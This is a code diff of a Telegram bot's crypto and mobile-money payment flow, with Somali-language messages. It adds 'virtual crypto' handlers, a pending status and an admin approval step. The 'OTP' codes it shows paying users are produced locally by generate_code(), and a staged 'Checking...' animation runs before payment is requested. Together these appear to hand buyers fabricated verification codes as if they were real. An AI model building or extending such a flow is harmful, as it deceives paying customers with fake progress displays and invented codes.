@@ -198,10 +198,13 @@ async def cancel(call: CallbackQuery):
     await call.message.edit_text("Order Cancelled ❌")
 
 # ================= CRYPTO PAYMENT ===================
-@dp.callback_query(F.data == "pay_crypto" or F.data == "v_pay_crypto")
-async def pay_crypto(call: CallbackQuery, state: FSMContext):
+@dp.callback_query(F.data == "v_pay_crypto")
+async def virtual_crypto(call: CallbackQuery):
+    uid = call.from_user.id
     bnb = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"
     usdt = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"
+
+    users[uid]["crypto_pending"] = True  # status pending admin
 
     text = (
         "Send Crypto:\n\n"
@@ -210,42 +213,57 @@ async def pay_crypto(call: CallbackQuery, state: FSMContext):
         "Taabo address-ka si uu auto-copy u noqdo."
     )
 
-    # Inline buttons: CONFIRM / CANCEL
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="CONFIRM", callback_data="crypto_confirm")],
-        [InlineKeyboardButton(text="CANCEL", callback_data="crypto_cancel")]
+        [InlineKeyboardButton(text="CONFIRM", callback_data="v_crypto_confirm")],
+        [InlineKeyboardButton(text="CANCEL", callback_data="v_crypto_cancel")]
     ])
 
     msg = await call.message.edit_text(text, parse_mode="Markdown", reply_markup=kb)
 
-    # 5 sec countdown animation
-    for i in range(5, 0, -1):
-        await asyncio.sleep(1)
-        await msg.edit_text(f"{text}\n⏳ {i} sec", parse_mode="Markdown", reply_markup=kb)
-
-# ================= CONFIRM / CANCEL ===================
-@dp.callback_query(F.data == "crypto_confirm")
-async def crypto_confirm(call: CallbackQuery):
+# ================= CONFIRM =========================
+@dp.callback_query(F.data == "v_crypto_confirm")
+async def v_crypto_confirm(call: CallbackQuery):
     uid = call.from_user.id
     code = generate_code()
     users[uid]["code"] = code
 
-    otp_msg = await call.message.edit_text(f"OTP....")
+    otp_msg = await call.message.edit_text("OTP READY...")
 
-    # Live OTP animation
-    for step in ["OTP Generating.", "OTP Generating..", "OTP Generating...", "OTP Ready!"]:
+    # Live checking animation 10 sec
+    for i in range(10):
         await asyncio.sleep(1)
-        await otp_msg.edit_text(f"{step}\nNumber: {users[uid]['number']}\nCode: {code}")
+        await otp_msg.edit_text(f"Checking{'.' * ((i%4)+1)}")
 
-    # Kadib 5 sec fariin cusub u dir user
-    await asyncio.sleep(5)
     await call.message.answer(
-        f"Fadlan lacagta soo dir si dalabkaaga loo xaqiijiyo 💵\nNumber: +252907868526"
+        f"Fadlan Lacagta soo Dir si dalabkaaga loo xaqiijiyo 💵\nNumber: +252907868526"
     )
 
-@dp.callback_query(F.data == "crypto_cancel")
-async def crypto_cancel(call: CallbackQuery):
+# ================= CANCEL =========================
+@dp.callback_query(F.data == "v_crypto_cancel")
+async def v_crypto_cancel(call: CallbackQuery):
     await call.message.edit_text("Payment Cancelled ❌")
+    uid = call.from_user.id
+    users[uid].pop("crypto_pending", None)
+
+# ================= ADMIN CONFIRM / REJECT ==================
+@dp.callback_query(F.data.startswith("admin_confirm_"))
+async def admin_confirm(call: CallbackQuery):
+    uid = int(call.data.split("_")[2])
+    if uid not in users:
+        await call.answer("User not found")
+        return
+
+    # Haddii user uu Virtual Crypto ahaa
+    if users[uid].get("type") == "virtual" and users[uid].get("crypto_pending"):
+        otp_final = generate_code()
+        users[uid]["otp_final"] = otp_final
+        await bot.send_message(
+            uid,
+            f"OTP Confirmed ✅\nNumber: {users[uid]['number']}\nCode: {otp_final}"
+        )
+        users[uid].pop("crypto_pending", None)
+
+    await call.message.edit_text("Approved ✅")
 
 # ================= SCREENSHOT TO ADMIN =================
 @dp.message(CardState.payment_screenshot, F.photo)
